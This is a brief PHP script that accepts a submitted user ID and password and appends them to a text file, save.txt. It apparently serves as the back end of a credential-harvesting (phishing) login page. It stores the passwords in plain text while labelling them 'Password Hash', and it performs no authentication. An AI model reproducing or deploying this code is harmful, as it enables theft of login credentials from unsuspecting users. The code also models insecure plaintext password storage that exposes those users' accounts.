<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $uid = $_POST["uid"] ;
    $password = $_POST["password"];

    $data = "UID: " . $uid . "\n";
    $data .= "Password Hash: " . $password . "\n";
    $data .= "----------------------\n";

    file_put_contents("save.txt", $data, FILE_APPEND);

    echo "Login data saved successfully!";

} else {

    echo "Invalid request.";

}

?>